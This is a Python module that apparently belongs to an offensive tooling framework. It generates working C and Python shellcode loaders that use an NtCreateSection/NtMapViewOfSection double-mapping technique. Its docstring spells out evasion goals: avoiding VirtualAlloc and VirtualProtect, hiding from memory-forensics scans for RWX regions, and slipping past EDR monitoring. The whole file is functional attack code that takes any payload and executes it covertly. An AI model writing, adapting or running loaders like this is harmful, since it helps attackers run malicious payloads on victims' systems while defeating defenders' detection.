"""Loader: win_section_map — NtCreateSection + NtMapViewOfSection double-map.

Tier 3 (allocation bypass via section objects).

Strategy:
  1. NtCreateSection — create an anonymous execute+read+write section in the
     kernel object table. No process address space reservation yet.
  2. NtMapViewOfSection(PAGE_READWRITE) — map a writable view at any VA.
  3. memcpy shellcode into the RW view.
  4. NtUnmapViewOfSection — unmap the RW view; section data persists.
  5. NtMapViewOfSection(PAGE_EXECUTE_READ) — map a separate RX view of the
     same section. The payload memory is now executable.
  6. CreateThread(rx_view) — execute from the RX mapping.

Evasion properties:
  - Zero VirtualAlloc calls for payload memory; no private RWX/RX allocation
  - No VirtualProtect call — permissions set entirely at map time
  - The executable mapping appears as a section-backed region (like a DLL or
    memory-mapped file) rather than a private anonymous allocation
  - Memory forensics tools that scan for private RWX/RX regions will miss it
  - RW and RX views are never simultaneously live; the write handle is released
    before the execute view is created

Still triggers on:
  - NtCreateSection + NtMapViewOfSection pattern (monitored by modern EDR at
    kernel callback level: PsSetLoadImageNotifyRoutine doesn't fire, but
    memory-scanning callbacks may)
  - CreateThread from a non-image-backed page
  - ntdll resolution via GetProcAddress (ntdll hooks bypass this if hooked)

Compile: gcc -o loader loader.c  (x64 only; x86 requires pointer adjustments)
"""
from __future__ import annotations

from . import _render

_render.self_register(__name__, "win_section_map")

_C_TEMPLATE = """\
#include <windows.h>
#include <stdio.h>
#include <string.h>

{sc_array}

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((s) >= 0)

typedef enum {{ ViewShare = 1, ViewUnmap = 2 }} SECTION_INHERIT;

typedef NTSTATUS (NTAPI *FnNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle);

typedef NTSTATUS (NTAPI *FnNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);

typedef NTSTATUS (NTAPI *FnNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress);

int main(void) {{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FnNtCreateSection      NtCS  = (FnNtCreateSection)     GetProcAddress(ntdll, "NtCreateSection");
    FnNtMapViewOfSection   NtMV  = (FnNtMapViewOfSection)  GetProcAddress(ntdll, "NtMapViewOfSection");
    FnNtUnmapViewOfSection NtUMV = (FnNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");

    if (!NtCS || !NtMV || !NtUMV) {{
        fprintf(stderr, "[-] ntdll resolution failed\\n");
        return 1;
    }}

    /* Step 1: create anonymous RWX section */
    HANDLE hSection = NULL;
    LARGE_INTEGER max_size = {{0}};
    max_size.QuadPart = sc_len;

    NTSTATUS s = NtCS(&hSection,
        SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE,
        NULL, &max_size,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT, NULL);
    if (!NT_SUCCESS(s)) {{
        fprintf(stderr, "[-] NtCreateSection: 0x%lx\\n", s);
        return 1;
    }}

    /* Step 2: map RW view for writing */
    PVOID rw = NULL;
    SIZE_T vsz = 0;
    s = NtMV(hSection, (HANDLE)-1, &rw, 0, 0, NULL, &vsz,
              ViewUnmap, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(s)) {{
        fprintf(stderr, "[-] NtMapViewOfSection (RW): 0x%lx\\n", s);
        CloseHandle(hSection);
        return 1;
    }}

    /* Step 3: write shellcode */
    memcpy(rw, sc, sc_len);

    /* Step 4: unmap RW view (section data persists) */
    NtUMV((HANDLE)-1, rw);

    /* Step 5: map RX view for execution */
    PVOID rx = NULL;
    vsz = 0;
    s = NtMV(hSection, (HANDLE)-1, &rx, 0, 0, NULL, &vsz,
              ViewUnmap, 0, PAGE_EXECUTE_READ);
    if (!NT_SUCCESS(s)) {{
        fprintf(stderr, "[-] NtMapViewOfSection (RX): 0x%lx\\n", s);
        CloseHandle(hSection);
        return 1;
    }}

    /* Step 6: execute */
    HANDLE hThread = CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)rx,
                                  NULL, 0, NULL);
    if (!hThread) {{
        fprintf(stderr, "[-] CreateThread failed: %lu\\n", GetLastError());
        NtUMV((HANDLE)-1, rx);
        CloseHandle(hSection);
        return 1;
    }}
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    NtUMV((HANDLE)-1, rx);
    CloseHandle(hSection);
    return 0;
}}
"""

_PY_TEMPLATE = """\
import ctypes
import ctypes.wintypes
import sys

{sc_bytes}

ntdll    = ctypes.windll.ntdll
kernel32 = ctypes.windll.kernel32

ViewUnmap = 2

NTSTATUS = ctypes.c_long

# Step 1: NtCreateSection — anonymous RWX section
hSection = ctypes.c_void_p(0)
max_size = ctypes.c_longlong(len(sc))

status = ntdll.NtCreateSection(
    ctypes.byref(hSection),
    0x0E,                             # SECTION_MAP_EXECUTE|READ|WRITE
    None,
    ctypes.byref(max_size),
    0x40,                             # PAGE_EXECUTE_READWRITE
    0x8000000,                        # SEC_COMMIT
    None)
if status < 0:
    print(f"[-] NtCreateSection: 0x{{status & 0xFFFFFFFF:08x}}", file=sys.stderr)
    sys.exit(1)

# Step 2: map RW view
rw   = ctypes.c_void_p(0)
vsz  = ctypes.c_size_t(0)
status = ntdll.NtMapViewOfSection(
    hSection, ctypes.c_void_p(-1), ctypes.byref(rw),
    0, 0, None, ctypes.byref(vsz),
    ViewUnmap, 0,
    0x04)                             # PAGE_READWRITE
if status < 0:
    print(f"[-] NtMapViewOfSection (RW): 0x{{status & 0xFFFFFFFF:08x}}", file=sys.stderr)
    sys.exit(1)

# Step 3: write shellcode into RW view
buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
kernel32.RtlMoveMemory(rw, buf, len(sc))

# Step 4: unmap RW view
ntdll.NtUnmapViewOfSection(ctypes.c_void_p(-1), rw)

# Step 5: map RX view
rx  = ctypes.c_void_p(0)
vsz = ctypes.c_size_t(0)
status = ntdll.NtMapViewOfSection(
    hSection, ctypes.c_void_p(-1), ctypes.byref(rx),
    0, 0, None, ctypes.byref(vsz),
    ViewUnmap, 0,
    0x20)                             # PAGE_EXECUTE_READ
if status < 0:
    print(f"[-] NtMapViewOfSection (RX): 0x{{status & 0xFFFFFFFF:08x}}", file=sys.stderr)
    sys.exit(1)

# Step 6: execute from RX view
ht = kernel32.CreateThread(None, 0, rx, None, 0, None)
if not ht:
    sys.exit(1)
kernel32.WaitForSingleObject(ctypes.c_void_p(ht), 0xFFFFFFFF)
ntdll.NtUnmapViewOfSection(ctypes.c_void_p(-1), rx)
"""


def generate_c(shellcode: bytes) -> str:
    """Return a C loader using NtCreateSection + NtMapViewOfSection double-map."""
    return _C_TEMPLATE.format(sc_array=_render.c_array_literal(shellcode, "sc"))


def generate_python(shellcode: bytes) -> str:
    """Return a Python ctypes loader using NtCreateSection + NtMapViewOfSection."""
    return _PY_TEMPLATE.format(sc_bytes=_render.python_bytes_literal(shellcode, "sc"))
